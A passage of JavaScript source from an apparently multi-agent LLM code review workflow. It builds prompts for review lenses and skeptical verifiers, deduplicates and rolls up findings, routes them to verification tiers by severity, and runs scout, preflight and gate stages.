Only report a violation you can name a concrete reachable path for. Put the triggering surface in \`blastRadius\`; in \`why\`, state the invariant and the exact old path that breaks it. Do NOT restate findings already in the ALREADY-FOUND set below — look for what they MISSED.

ALREADY-FOUND (from other lenses / earlier rounds — do not repeat):
${priorSummary}

Return {lens: "negative-space", findings: [...]} using the shared finding schema. Set \`ruleId\` to the matching ${profile.rubricSkill} rules.md ID or "" if none fits. Observability: the workflow records this run — do NOT write your own record.`
}

function lensPrompt(lens, priorSummary, profile, plan) {
  if (lens === 'negative-space') return negativeSpacePrompt(priorSummary, profile, plan)
  return `You are the **${lens}** review lens for a ${profile.lang} diff. Review ONLY this slice; ignore everything else (other lenses cover it). Load the ${profile.rubricSkill} skill for the rubric${profile.navSkill ? ` and the ${profile.navSkill} skill for context expansion` : ''}.

SLICE: ${profile.lensBrief[lens] || lens}
${strict && lens === 'maintainability' ? '\nSTRICT MODE: apply the maintainability bar as a *presumption of block* — each maintainability issue is a blocker unless the author clearly justified it in the diff or brief. Be harsh, but stay grounded — every finding still needs a concrete cited file:line and survives refutation; do not invent issues.\n' : ''}
Diff base: ${lensBase ? `\`${flattenField(lensBase)}\`` : 'uncommitted changes / most recent commit'}. Review with \`git diff ${lensBase ? `--merge-base ${shq(lensBase)}` : 'HEAD'} -- ${profile.diffGlobs.join(' ')}\`.
${priorRound ? (fullRescan
  ? `RE-REVIEW (full re-scan): review the WHOLE diff (base ${flattenField(lensBase)}...HEAD), not just the latest fixes — an earlier round may have missed a defect in code it did not touch. Prior findings are adjudicated separately and any you re-surface are de-duplicated downstream, so spend your effort on defects that are NOT already obviously known.`
  : `RE-REVIEW: you are reviewing ONLY the fix commits since the prior round (base ${flattenField(lensBase)}). Prior findings are adjudicated separately — do not re-report them; surface only NEW defects the fixes introduced.`) : ''}
${plan.intent ? `INTENT (what the change should do): ${plan.intent}` : ''}
${plan.spec ? `STATED SPEC / AUTHOR CLAIMS (verbatim PR/commit description — treat as the spec; the intent lens must check EACH claim against the code, and any lens may use it):\n"""\n${plan.spec}\n"""` : ''}
${plan.churn?.length ? `HOT FILES (scrutinize harder): ${plan.churn.join(', ')}` : ''}

CONTEXT EXPANSION (required): for each finding, trace definitions / uses / consumers of the changed symbols (Grep/Glob${profile.navSkill ? ' + LSP' : ''}) before judging — do not read the diff in isolation. If a finding depends on code outside the diff, say so in \`why\`.
BLAST-RADIUS (required): for each changed PUBLIC surface you touch, note how many consumers are affected and set a breaking-change flag in \`blastRadius\`.
CONFIDENCE: report everything you suspect, located. Do NOT self-censor borderline findings — verification happens downstream. Each finding needs file:line (use file:"" line:0 only when truly not locatable).
WHERE-CHECKED (required field): a finding usually rests on a premise that is NOT visible at the line you cite — "the dependency rejects this", "this is reachable from untrusted input", "no caller guards it", "the sibling path does X". Every such premise must be pinned to a \`file:line\` you ACTUALLY OPENED and read, including inside dependency sources (\`~/.cargo/registry\`, the vendored tree, the flake input) — put them in \`whereChecked\`. An off-site premise you did not open is not admissible: either open it, or drop the claim and report only what the cited line itself shows. Set \`whereChecked\` to "" ONLY when the finding needs no off-site premise at all. Do not restate the cited defect line there — it adds nothing.
RULE ID (required field): set \`ruleId\` to the matching catalog ID from the ${profile.rubricSkill} skill's rules.md when the finding maps to a listed rule; use "" for a novel finding with no catalog rule. Do not force a bad fit.
${profile.id === 'rust' && lens === 'tests' && (plan.sizeBucket === 'medium' || plan.sizeBucket === 'large') ? 'If `cargo mutants` is installed, you MAY run it time-boxed on the changed files to surface contracts no test would catch a regression on; skip silently if absent.' : ''}
ALREADY-FOUND (do not repeat; look for what these MISSED):
${priorSummary}

Return {lens, findings[]}.

Observability: the review workflow records this run — do NOT write your own record.`
}

// `profile` is threaded in for the exclusion catalog: it is per-profile (only the rust rubric ships
// an fp-rules.md today), and naming a file the nix reviewer does not have would send it hunting.
function verifyPrompt(f, idx, isTool, gateProvenance, profile) {
  // Model-authored fields enter this prompt as context — guard them the same way the adjudicate track
  // does: flatten identifier/locator fields via promptFields (newline is the single-value injection
  // vector; identifier chars are load-bearing for the grep) and markdown-strip the prose (why/source).
  const pf = promptFields(f)
  const src = sanitizeAttack(f.source)
  const why = sanitizeAttack(f.why)
  const exclusionCatalog = profile?.fpRules
    ? `\nEXCLUSION CATALOG: your rejection is itself a claim and carries the same burden of proof as the finding. Load the ${profile.rubricSkill} skill's ${profile.fpRules} and, when one of its precedents fires, name the ID in \`reason\` (e.g. "refuted per FP-006: proven-Some unwrap"). Run the TRACE each rule demands — "looks guarded" does not fire the invariant-protected rule; following the invariant to its source and showing it dominates the sink on every path does. Two of them (FP-002 operator-controlled input, FP-005 operator-only panic surface) are severity DOWNGRADES, not refutations: the claim still holds, only the attacker's access is missing — say so in \`reason\` and leave refuted=false. The file also lists the KEEP-* non-reasons, dismissals that sound decisive and have repeatedly killed real defects (soundness in a public API no current caller reaches, a logic bug in safe Rust, a panic unwinding through an unsafe region). If nothing in the catalog fits, judge on the merits — never force a bad fit to justify a drop.\n`
    : ''
  const head = isTool
    ? `You are verifier #${idx + 1} for a TOOL-REPORTED code review finding (source: ${src}). Deterministic tool output outranks your judgement — you may refute it ONLY by re-running the tool, never on reasoning alone.`
    : `You are skeptic #${idx + 1} trying to REFUTE a code review finding. Default to refuted=true when uncertain whether the technical claim holds — only let real findings through.`
  return `${head}

FINDING: [${pf.severity}] ${pf.title}
  at ${pf.file || '?'}:${f.line || 0}
  why: ${why}
  source: ${src}${f.ruleId ? ` · rule ${pf.ruleId}` : ''}
  off-site evidence claimed: ${f.whereChecked ? pf.whereChecked : '(none — the finding claims to be self-contained at the cited line)'}

MECHANICAL CHECK FIRST: if a tool can decide this finding (a clippy lint, statix/deadnix rule, semgrep rule, cargo-audit advisory — infer from source/ruleId/title), RUN it scoped to the cited file; its output overrides your judgement in BOTH directions: tool still reports it → refuted=false; tool demonstrably no longer reports it → refuted=true (quote the output in reason).${gateProvenance ? ` The gate invoked the tools as: "${flattenField(gateProvenance)}" — if a tool is not on PATH, reproduce the gate's invocation (e.g. \`nix run nixpkgs#<tool> --\`) before declaring it unrunnable.` : ''}${isTool ? ' If you STILL cannot run the tool, set refuted=false — an unverifiable tool finding stays alive.' : ' If no tool applies, judge it yourself.'}

REFUTATION RULE: refuted=true means the finding's TECHNICAL CLAIM is false — the cited code does not contain the claimed defect, or the deciding tool demonstrably no longer reports it. Context is NOT refutation: that the code is test/fixture/example-only, looks intentional, is unlikely to be built or run, or has low impact NEVER justifies refuted=true. Record that context in reachable=false and reason instead — severity is calibrated downstream.

${exclusionCatalog}Open the cited file and check:
1. citedLineMatches: does ${pf.file || '?'}:${f.line || 0} actually contain what the finding claims? (If the citation is wrong/hallucinated → citedLineMatches=false.)
2. reachable: is this code reachable in production, or is it test/example/fixture-only code? (Test-only → reachable=false. This does NOT refute the finding — it only calibrates severity downstream.) REACHABILITY IS ABOUT THE ROUTE, not just the destination: if the claim is "reachable from untrusted input", check that the ROUTE runs from the real entry point — the parser, the handler, the deserializer, the public API — on attacker-supplied data. Reaching the state by CONSTRUCTING the object directly (a builder, \`new\`, a test fixture, an internal constructor) bypasses exactly the validation the question is about, and proves nothing about untrusted-input reachability. That trap catches careful reviewers, so check it explicitly rather than assuming the route was the obvious one.
3. refuted: is the technical claim itself false? (${isTool ? 'Tool-decided as above.' : 'Mechanical check first, then your judgement; when uncertain about the claim, refuted=true.'})
4. premiseSupported: identify the finding's LOAD-BEARING premise — the one claim that, if false, makes the finding evaporate. If it lives outside the cited line (the dependency behaves this way, this is reachable from untrusted input, no caller guards it, the sibling does X), OPEN the \`whereChecked\` location and check it actually shows that. premiseSupported=false when the premise is off-site and \`whereChecked\` is empty, points somewhere that does not show it, or merely restates the cited line. premiseSupported=true when the finding is genuinely self-contained at the cited line, or the off-site evidence checks out. Do NOT set refuted=true just because a premise is uncited — unsupported is not disproven; that is what this field is for, and it demotes the finding downstream instead of killing it.

Return {refuted, citedLineMatches, reachable, premiseSupported, reason}.`
}

// Cross-lens dedup BEFORE verification. key() above is exact (file:line:title), so two lenses
// wording the same defect differently both enter the pool — and each duplicate would buy its own
// verifier fan-out. A cheap grouping pass merges same-defect findings first; synthesis keeps its
// own dedup instruction as a safety net.
const DEDUP_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['groups'],
  properties: {
    groups: {
      type: 'array',
      items: { type: 'array', items: { type: 'integer' } },
      description: 'each inner array = indices of findings that describe the SAME underlying defect; singletons omitted; empty if all distinct',
    },
  },
}
// Mechanical roll-up of high-volume, low-value rule IDs. The api-idioms lens brief already ASKS for
// this ("do NOT file one finding per occurrence — roll repeated instances into ONE finding"), and the
// run store shows it is not obeyed: one lens produced 126 confirmed findings over 21 runs, 100 of
// them Low/Info. An instruction the model can quietly skip is not a cap; this is. The excess is
// folded into the representative finding rather than dropped, and the count is stated in the title
// and logged — a silent truncation would read as "there were only N", which is worse than the flood.
const ROLLUP_MAX = 3
function rollupPool(pool, profile) {
  const ids = profile.rollupRuleIds || []
  if (!ids.length) return pool
  const groups = new Map()
  const out = []
  for (const f of pool) {
    const id = f.ruleId || ''
    if (!ids.includes(id)) { out.push(f); continue }
    const k = `${f.source || ''}::${id}`
    const g = groups.get(k) || (groups.set(k, []), groups.get(k))
    g.push(f)
  }
  for (const [, g] of groups) {
    // Order by severity so the representative is the worst instance, not an arbitrary one.
    const sorted = g.slice().sort((a, b) => (SEV_RANK[a.severity] ?? 9) - (SEV_RANK[b.severity] ?? 9))
    if (sorted.length <= ROLLUP_MAX) { out.push(...sorted); continue }
    const keep = sorted.slice(0, ROLLUP_MAX)
    const folded = sorted.slice(ROLLUP_MAX)
    const rep = folded[0]
    const where = folded.slice(0, 6).map(f => `${f.file || '?'}:${f.line || 0}`).join(', ')
    out.push(...keep, {
      ...rep,
      title: `${rep.title} — and ${folded.length - 1} more of the same (${rep.ruleId})`,
      why: `${rep.why} Repeated ${folded.length} more times across the diff (${where}${folded.length > 6 ? ', …' : ''}); rolled into one finding because per-occurrence reporting of this rule buries the rest of the review. Fix the pattern, not the instance.`,
    })
    log(`[${profile.id}] Roll-up: ${g.length}× ${rep.ruleId} from '${rep.source}' → ${keep.length} individual + 1 grouped`)
  }
  return out
}

// Two findings at the SAME file:line whose titles are near-identical are one defect, and the model
// dedup pass is measurably bad at saying so: it runs on haiku with a 160-char slice of `why`, and its
// own "same file+line alone is NOT enough / when in doubt do NOT group" instruction biases it toward
// keeping both. Measured on a payments-service run: the 'reconciler' and 'errors' lenses filed the same
// reconcile-alarm defect at one line with titles sharing their first 76 characters, survived dedup as
// two findings, and each paid a full 4-vote individual verification. Catch that deterministically — the
// model pass then only has to handle the genuinely reworded cross-file duplicates it is good at.
const SAME_SPOT_OVERLAP = 0.6
function sameSpotGroups(pool) {
  const bySpot = new Map()
  pool.forEach((f, i) => {
    if (!f || !f.file) return // no location → nothing to key on; leave it to the model pass
    const k = `${String(f.file).toLowerCase()}:${f.line || 0}`
    ;(bySpot.get(k) || (bySpot.set(k, []), bySpot.get(k))).push(i)
  })
  const groups = []
  for (const [, idxs] of bySpot) {
    if (idxs.length < 2) continue
    const taken = new Set()
    for (const i of idxs) {
      if (taken.has(i)) continue
      const g = [i]
      for (const j of idxs) {
        if (j === i || taken.has(j)) continue
        if (shingleOverlap(pool[i].title, pool[j].title) >= SAME_SPOT_OVERLAP) { g.push(j); taken.add(j) }
      }
      if (g.length > 1) { taken.add(i); groups.push(g) }
    }
  }
  return groups
}

async function dedupPool(pool, profile) {
  if (pool.length < 2) return pool
  const isToolSrc = f => isToolSource(profile, f.source)
  const listing = pool.map((f, i) => `${i}. ${f.file || '?'}:${f.line || 0} [${f.severity}] (${f.source}) ${f.title} — ${String(f.why || '').slice(0, 160)}`).join('\n')
  let res = null
  try {
    res = await ragent(
      `You are deduplicating code-review findings BEFORE verification. Different lenses word the same defect differently. Group ONLY findings that describe the SAME underlying defect — same root cause, where one edit fixes all of them (e.g. one redundant loop reported by both a performance and an idioms lens). Same file+line alone is NOT enough: two distinct defects can share a line. When in doubt, do NOT group.

FINDINGS:
${listing}

Return {groups: [[i, j, ...], ...]} — index groups of same-defect findings; omit singletons; {groups: []} if all are distinct.`,
      { label: `dedup:${profile.id}`, phase: 'Verify', schema: DEDUP_SCHEMA, model: 'haiku', effort: 'low' },
    )
  } catch (e) {
    log(`[${profile.id}] dedup pass failed (${String((e && e.message) || e).slice(0, 80)}) — verifying the raw pool`)
  }
  // Deterministic same-spot groups go FIRST: the "overlapping groups: first wins" rule below then
  // makes them authoritative over a model group that would have split the same indices differently.
  const detGroups = sameSpotGroups(pool)
  const groups = detGroups.concat(
    (res?.groups ?? []).filter(g => Array.isArray(g) && g.length > 1 && g.every(i => Number.isInteger(i) && i >= 0 && i < pool.length)),
  )
  const merged = []
  const inGroup = new Set()
  for (const g of groups) {
    if (g.some(i => inGroup.has(i))) continue // overlapping groups: first wins
    for (const i of g) inGroup.add(i)
    const members = g.map(i => pool[i])
    // Base = the strictest member: tool-sourced first (a tool finding can only be refuted by
    // re-running the tool), then highest severity.
    const base = members.slice().sort((a, b) => (isToolSrc(b) - isToolSrc(a)) || ((SEV_RANK[a.severity] ?? 9) - (SEV_RANK[b.severity] ?? 9)))[0]
    const others = members.filter(m => m !== base)
    // Carry ALL contributing sources so a downstream source-keyed rule (strict maintainability
    // escalation) still fires when its trigger lens was merged into a different-source base.
    const sources = [...new Set(members.map(m => m.source).filter(Boolean))]
    // Union the off-site evidence too: a merged-away member may have pinned the premise the base
    // only asserted, and dropping it would cost the group its Confirmed tier at verification.
    const whereChecked = [...new Set(members.map(m => m.whereChecked).filter(Boolean))].join('; ')
    merged.push({ ...base, sources, whereChecked, why: `${base.why} (same defect also reported by: ${others.map(m => m.source).join(', ')})` })
  }
  if (!merged.length) return pool
  const out = pool.filter((_f, i) => !inGroup.has(i)).concat(merged)
  const detFolded = detGroups.reduce((n, g) => n + g.length - 1, 0)
  log(`[${profile.id}] Dedup before verify: ${pool.length} → ${out.length} (${pool.length - out.length} cross-lens duplicate(s) merged — ${detFolded} of them same-spot, caught deterministically)`)
  return out
}

// Verify a pool of findings → {confirmed, suspected, dropped, refuted}. Rigor scales with the profile's plan.
// Staged verification: cull votes run on a cheap model (sonnet); a High/Critical additionally gets exactly
// ONE authoritative opus vote, so the cheap model can neither confirm nor drop a high-stakes finding alone.
const CULL_MODEL = 'sonnet'

// ---- verification budget ----
// Verification is ~2/3 of a review's entire cost and scales linearly with finding count, uncapped:
// one measured run spent 154 agents / 21MB of transcript on 111 findings. Route each finding to the
// cheapest treatment that cannot change its outcome.
//
// INDIVIDUAL — Critical/High, plus any severity carrying a rule from a family that blocks on sight.
// These decide the verdict and get the full adversarial panel, never batched, never skipped.
// BATCHED — Medium. Can only reach Warning, so one agent judges a group of them instead of one each.
// SKIPPED — Low/Info. No combination of verdicts on these can move Approve/Warning/Block, and craft
// already has the right tier for an unjudged finding: Suspected is defined as "borderline or
// UNVERIFIED; surfaced for the author, never changes the verdict". Spending an adversarial skeptic to
// move a finding from Suspected to Suspected buys nothing. The residual risk is a lens UNDER-calling
// severity, which the blocking-family escape hatch below covers for the families where it would hurt.
// The escape hatch belongs ONLY on the skipped tier. Batching is still verification — a Medium the
// lens under-called gets a real adversarial judgement either way — so the only place an under-call
// goes unexamined is `skip`. A first attempt keyed on the whole SAF/ERR/CON *families* dragged most
// of a Rust review back into individual treatment (measured: 88 of 137 agents, 49% of transcript
// volume, wiping out the saving) because those families cover unwrap, dropped errors and every
// concurrency rule. Key it on the specific CRITICAL-tier rules instead, and only when the lens
// filed them at Low/Info — that combination *is* the under-call, and it is rare.
const CRITICAL_TIER_RULES = new Set(['SAF-001', 'SAF-002', 'SAF-003', 'SAF-004', 'SAF-005', 'SAF-006', 'SAF-008', 'ERR-001', 'ERR-002'])
const BATCH_SIZE = 6
function verifyTier(f) {
  if (f.severity === 'Critical' || f.severity === 'High') return 'individual'
  if (f.severity === 'Medium') return 'batch'
  // Low/Info: skipped, unless the rule it cites is one that blocks on sight — then the severity is
  // more likely a mislabel than a judgement, and it is worth one verifier to find out.
  return CRITICAL_TIER_RULES.has(f.ruleId || '') ? 'individual' : 'skip'
}
// Do two verdicts say the same thing on every axis tierFromVotes reads? Only then can the opening
// pair stand in for the full panel — a disagreement on ANY axis (not just `refuted`) can move the
// tier, because citedLineMatches gates refutation outright and reachable/premiseSupported demote.
function votesAgree(a, b) {
  if (!a || !b) return false
  return ['refuted', 'citedLineMatches', 'reachable', 'premiseSupported'].every(k => Boolean(a[k]) === Boolean(b[k]))
}
// Shared vote→tier decision, so the batched path cannot drift from the individual one.
function tierFromVotes(f, votes) {
  const v = votes.filter(Boolean)
  if (!v.length) return { ...f, tier: 'suspected' } // verification died → don't drop, demote
  const half = v.length / 2
  const lineOk = v.filter(x => x.citedLineMatches).length >= Math.ceil(half)
  const reach = v.filter(x => x.reachable).length >= Math.ceil(half)
  const premiseOk = v.filter(x => x.premiseSupported).length >= Math.ceil(half)
  const refutes = v.filter(x => x.refuted).length
  let tier
  if (!lineOk) tier = 'refuted'
  else if (refutes > half) tier = 'refuted'
  else if (refutes === 0) tier = 'confirmed'
  else tier = 'suspected'
  if (tier === 'confirmed' && !premiseOk) {
    return { ...f, tier: 'suspected', why: `${f.why} (demoted to Suspected: the load-bearing premise is off-site and no verifier could pin it to real code${f.whereChecked ? ` — claimed at ${f.whereChecked}` : ', and whereChecked was empty'})` }
  }
  if (tier === 'confirmed' && !reach) {
    const demoted = DEMOTE[f.severity] || f.severity
    return { ...f, tier, severity: demoted, why: `${f.why} (severity demoted ${f.severity}→${demoted}: not on a production-reachable path)` }
  }
  return { ...f, tier }
}
const BATCH_VERDICT_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['verdicts'],
  properties: {
    verdicts: {
      type: 'array',
      description: 'one entry per finding in the batch, keyed by its index — every index must appear',
      items: {
        type: 'object',
        additionalProperties: false,
        required: ['index', 'refuted', 'citedLineMatches', 'reachable', 'premiseSupported', 'reason'],
        properties: {
          index: { type: 'integer' },
          refuted: { type: 'boolean' },
          citedLineMatches: { type: 'boolean' },
          reachable: { type: 'boolean' },
          premiseSupported: { type: 'boolean' },
          reason: { type: 'string' },
        },
      },
    },
  },
}
function batchVerifyPrompt(group, profile) {
  const pfs = group.map((f, i) => {
    const pf = promptFields(f)
    return `--- FINDING ${i} ---
[${pf.severity}] ${pf.title}
  at ${pf.file || '?'}:${f.line || 0}
  why: ${sanitizeAttack(f.why)}
  source: ${sanitizeAttack(f.source)}${f.ruleId ? ` · rule ${pf.ruleId}` : ''}
  off-site evidence claimed: ${f.whereChecked ? pf.whereChecked : '(none — claims to be self-contained at the cited line)'}`
  }).join('\n')
  return `You are a skeptic verifying ${group.length} INDEPENDENT ${profile.lang} review findings in one pass. They are batched only to save cost — judge each ENTIRELY on its own evidence. Never let one finding's verdict influence another's, and never assume a batch "should" contain some proportion of real ones.

Open the cited file for EACH finding and judge it exactly as you would alone. Default to refuted=true when uncertain whether a technical claim holds.

REFUTATION RULE: refuted=true means the TECHNICAL CLAIM is false — the cited code does not contain the claimed defect. Context is NOT refutation: test/fixture-only, looks intentional, low impact — none of those justify refuted=true. Record that in reachable=false and reason.

Per finding, decide:
- citedLineMatches: does the cited file:line actually contain what the finding claims?
- reachable: production-reachable, or test/example/fixture-only? Reachability is about the ROUTE — a state reached by CONSTRUCTING the object directly (builder, \`new\`, a fixture) bypasses the validation the question is about and proves nothing about untrusted-input reachability.
- refuted: is the technical claim itself false?
- premiseSupported: name the one claim that, if false, makes the finding evaporate. If it lives outside the cited line, OPEN the claimed off-site evidence and check it shows that. false when the premise is off-site and the evidence is empty, wrong, or merely restates the cited line. Unsupported is NOT disproven — do not raise refuted for it.

${pfs}

Return {verdicts: [...]} with ONE entry per finding, each carrying its \`index\` (0..${group.length - 1}). Every index must appear — omitting one silently deletes a finding from the review.`
}
async function verifyPool(items, plan, profile, gateProvenance) {
  const route = { individual: [], batch: [], skip: [] }
  for (const f of items) route[verifyTier(f)].push(f)

  // Skipped tier: straight to Suspected, and SAY so on the finding — an unverified item that reads
  // like a verified one is exactly the silent cap this codebase refuses elsewhere.
  const skipped = route.skip.map(f => ({
    ...f,
    tier: 'suspected',
    why: `${f.why} (not adversarially verified: ${f.severity} cannot change the verdict, so it is surfaced as Suspected rather than spending a verifier on it)`,
  }))

  // Batched tier: group by file so one agent reads one file's context once.
  const byFile = new Map()
  for (const f of route.batch) {
    const k = f.file || '?'
    ;(byFile.get(k) || (byFile.set(k, []), byFile.get(k))).push(f)
  }
  const groups = []
  for (const [, fs] of byFile) for (let i = 0; i < fs.length; i += BATCH_SIZE) groups.push(fs.slice(i, i + BATCH_SIZE))

  // Batched and individual verification look at DISJOINT findings — routing put each one in exactly
  // one bucket — so awaiting the batch wave before starting the individual one bought nothing but
  // latency. Measured on one run: batches ran +81..89min and individuals +89..102min, strictly
  // nose-to-tail. They are built as two thunk lists and handed to ONE parallel, so the slowest batch
  // no longer holds up the first verifier.
  const batchThunks = groups.map(group => () =>
    ragent(batchVerifyPrompt(group, profile), { label: `verify-batch:${group[0].file || '?'}(${group.length})`, phase: 'Verify', schema: BATCH_VERDICT_SCHEMA, model: CULL_MODEL })
      .then(res => group.map((f, i) => {
        const v = (res?.verdicts ?? []).find(x => x && x.index === i)
        // A missing index is a verifier that lost a finding, not a refutation: fall back to Suspected.
        return v ? tierFromVotes(f, [v]) : { ...f, tier: 'suspected', why: `${f.why} (batch verifier returned no verdict for this finding)` }
      }))
      .catch(() => group.map(f => ({ ...f, tier: 'suspected' }))))

  if (route.skip.length || groups.length) {
    log(`[${profile.id}] Verify routing: ${route.individual.length} individual · ${route.batch.length} batched into ${groups.length} agent(s) · ${route.skip.length} surfaced unverified (Low/Info cannot move the verdict)`)
  }

  const individualThunks = route.individual.map(f => () => {
    // Anything not produced by a review lens came from a deterministic tool (gate seeds: clippy-pedantic, statix, deadnix, semgrep, …) — except dep-context, a reasoning seed (see isToolSource).
    const isTool = isToolSource(profile, f.source)
    const isHigh = f.severity === 'Critical' || f.severity === 'High'
    const n1 = isHigh ? Math.max(1, plan.verifyVotes) : 1
    // Cull votes on the cheap model.
    const cull = i => () =>
      ragent(verifyPrompt(f, i, isTool, gateProvenance, profile), { label: `verify:${f.file || '?'}:${f.line || 0}#c${i + 1}`, phase: 'Verify', schema: VERDICT_SCHEMA, model: CULL_MODEL })
    if (!isHigh) return parallel([cull(0)]).then(vs => tierFromVotes(f, vs))
    // A High/Critical always gets exactly one authoritative opus vote combined with the cull votes.
    const auth = () =>
      ragent(verifyPrompt(f, n1, isTool, gateProvenance, profile), { label: `verify:${f.file || '?'}:${f.line || 0}#auth`, phase: 'Verify', schema: VERDICT_SCHEMA, model: plan.lensModel })
    // Open with the DECIDING pair — one cheap cull plus the authoritative vote — and buy the remaining
    // cull votes only when those two disagree. tierFromVotes is a majority rule, so a unanimous pair
    // lands on exactly the tier a unanimous four would: the extra votes only ever change the outcome
    // when there is a split to break. Measured justification: on a security-sensitive Rust diff
    // verifyVotes is forced to 3, so every High cost 4 agents — 72 of one run's 137 — while the whole
    // verification pass refuted 3% of candidates. Nearly all of those votes were re-confirming an
    // already-unanimous verdict. When they DO split, the escalation restores the full n1+1 panel, so
    // no contested finding is decided on thinner evidence than before.
    return parallel([cull(0), auth]).then(async vs => {
      const opening = vs.filter(Boolean)
      if (opening.length === 2 && votesAgree(opening[0], opening[1])) return tierFromVotes(f, opening)
      const rest = await parallel(Array.from({ length: Math.max(0, n1 - 1) }, (_unused, i) => cull(i + 1)))
      return tierFromVotes(f, opening.concat(rest.filter(Boolean)))
    })
  })
  // One wave. A batch thunk resolves to an ARRAY of judged findings (one per finding in the group),
  // an individual thunk to a single one — flatten the batch side back out before merging.
  const settledVerdicts = await parallel(batchThunks.concat(individualThunks))
  const batched = settledVerdicts.slice(0, batchThunks.length).filter(Boolean).flat()
  const judged = settledVerdicts.slice(batchThunks.length)
  const vp = judged.filter(Boolean).concat(batched, skipped)
  const refuted = vp.filter(f => f.tier === 'refuted')
  return {
    confirmed: vp.filter(f => f.tier === 'confirmed'),
    suspected: vp.filter(f => f.tier === 'suspected'),
    dropped: refuted.length,
    refuted,
  }
}

// ================= Per-profile pipeline: scout → gate → lenses → verify → critic =================
async function reviewProfile(profile) {
  // ---- Scout ----
  const scout = await ragent(scoutPrompt(profile), { label: `scout:${profile.id}`, schema: SCOUT_SCHEMA, model: 'haiku', effort: 'low', phase: 'Scout' })
  const plan = {
    sizeBucket: scout?.sizeBucket ?? 'medium',
    lenses: (scout?.lenses?.length ? scout.lenses.filter(l => profile.lenses.includes(l)) : profile.lenses.slice()),
    maxRounds: scout?.maxRounds ?? 2,
    verifyVotes: scout?.verifyVotes ?? 1,
    lensModel: scout?.lensModel ?? 'opus',
    isLibrary: profile.usesLibrary ? (scout?.isLibrary ?? false) : false,
    securitySensitive: scout?.securitySensitive ?? true,
    intent: scout?.intent ?? intentArg,
    spec,
    churn: scout?.churn ?? [],
  }
  if (!plan.lenses.length) plan.lenses = profile.lenses.slice()
  // "Always" lenses are enforced HERE, not left to the scout: smoke runs showed prompt-side
  // "always include X" gets dropped. 'intent' is the lens that catches correct-looking code
  // with wrong behavior — it runs at every size.
  for (const l of (profile.alwaysLenses || [])) if (profile.lenses.includes(l) && !plan.lenses.includes(l)) plan.lenses.push(l)
  if (strict && profile.lenses.includes('maintainability') && !plan.lenses.includes('maintainability')) plan.lenses.push('maintainability')
  // Security-sensitive rigor floor: don't let the size heuristic gate rigor on a security-touching change.
  if (plan.securitySensitive) {
    for (const l of profile.lenses) if (!plan.lenses.includes(l)) plan.lenses.push(l)
    plan.verifyVotes = Math.max(plan.verifyVotes, 3)
    plan.maxRounds = Math.max(plan.maxRounds, 2)
  }
  // Negative-space lens where new reachable surface tends to appear.
  if ((plan.securitySensitive || plan.sizeBucket === 'large') && !plan.lenses.includes('negative-space')) plan.lenses.push('negative-space')
  // Compat lens on large diffs too: changed serialized/persisted representations break other-versioned
  // readers (rolling deploy, already-stored rows) invisibly to the code-intrinsic lenses. Security-sensitive
  // diffs already get it via the all-lenses floor above (compat ∈ profile.lenses).
  if (plan.sizeBucket === 'large' && profile.lenses.includes('compat') && !plan.lenses.includes('compat')) plan.lenses.push('compat')
  log(`[${profile.id}] ${scout?.notes ?? 'scout: medium/all lenses'} · ${plan.sizeBucket}${plan.securitySensitive ? ' · SECURITY floor (all lenses, 3-vote)' : ''}${plan.lenses.includes('negative-space') ? ' · +negative-space' : ''}`)

  // Lens runner: prefer the profile's dedicated reviewer agent; if that agent type is not
  // registered in this session (stale plugin registry), fall back to the generic workflow
  // subagent — lens prompts are self-contained. The miss is LEARNED once (reviewerAgentMissing):
  // without it the absent agent type is re-attempted on every lens × round, which floods the run
  // with "agent type '<x>' not found". Both failure shapes are handled — a thrown /not found/ and
  // a null return (some runtimes signal an unknown agent type that way). Record the real failure
  // reason so INCOMPLETE reporting doesn't have to guess (budget vs registry vs death).
  const lensFailures = new Map()
  let reviewerAgentMissing = false
  async function runLens(lens, prompt, phaseName, labelSuffix) {
    const opts = { label: `lens:${profile.id}:${lens}${labelSuffix}`, phase: phaseName, schema: FINDINGS_SCHEMA, model: plan.lensModel }
    const runGeneric = async () => {
      try {
        return await ragent(prompt, opts)
      } catch (e) {
        lensFailures.set(lens, String((e && e.message) || e).slice(0, 160))
        return null
      }
    }
    if (reviewerAgentMissing) return runGeneric()
    try {
      const res = await ragent(prompt, { ...opts, agentType: profile.reviewerAgent })
      if (res != null) return res
      // Null (not a throw) from the reviewer path: on some runtimes an unknown agent type returns
      // null rather than throwing. ragent already retried; try the generic subagent once. Do NOT
      // set reviewerAgentMissing — a null can be a transient API death, so later lenses still get
      // a shot at the real reviewer agent.
      return await runGeneric()
    } catch (e) {
      const msg = String((e && e.message) || e)
      if (!/not found/i.test(msg)) { lensFailures.set(lens, msg.slice(0, 160)); return null }
      reviewerAgentMissing = true
      log(`⚠️ [${profile.id}] agent type '${profile.reviewerAgent}' not registered here — routing remaining lenses to the generic subagent`)
      return await runGeneric()
    }
  }

  // ---- Preflight ----
  // Cheap and first: resolve the runner, the compile blockers and what CI already covers, so the gate
  // spends its time on signals rather than on discovering its own environment. Best-effort by design —
  // a preflight that dies just leaves the gate to work it out the old way.
  const preflight = await ragent(preflightPrompt(profile, { baseRef }),
    // A tight deadline is safe HERE and nowhere else: losing preflight costs a fallback, not the
    // review — the gate still establishes everything itself, just the slow way.
    { label: `preflight:${profile.id}`, schema: PREFLIGHT_SCHEMA, phase: 'Gate', model: 'haiku', effort: 'low', deadlineMs: 420000 })
  if (preflight) {
    log(`[${profile.id}] Preflight: runner ${preflight.runner ? `\`${preflight.runner.trim()}\`` : '(none)'}`
      + ` · ${preflight.blockers?.length ? `${preflight.blockers.length} compile blocker(s)` : 'no compile blockers'}`
      + ` · CI covers ${preflight.ciCovers?.length ? preflight.ciCovers.join(', ') : 'nothing'}`
      + `${preflight.missingTools?.length ? ` · missing: ${preflight.missingTools.join(', ')}` : ''}`)
  }

  // ---- Gate ----
  const gate = await ragent(profile.gate({ baseRef, isLibrary: plan.isLibrary, securitySensitive: plan.securitySensitive, preflight }),
    { label: `gate:${profile.id}`, schema: GATE_SCHEMA, phase: 'Gate', effort: 'medium' })
  const gateStatus = gate?.status ?? 'unknown'
  const gateProvenance = gate?.provenance ?? 'gate not established'
  const failedChecks = gate?.failedChecks ?? []
  // Red, real, and NOT this diff's doing. Kept out of failedChecks so it cannot stop the review, and
  // out of notes so it cannot be quietly lost: it prints on every verdict, including a green one.
  const carriedChecks = gate?.carriedChecks ?? []
  const seedFindings = (gate?.seedFindings ?? []).map(f => ({ ...f, source: f.source || 'tool' }))
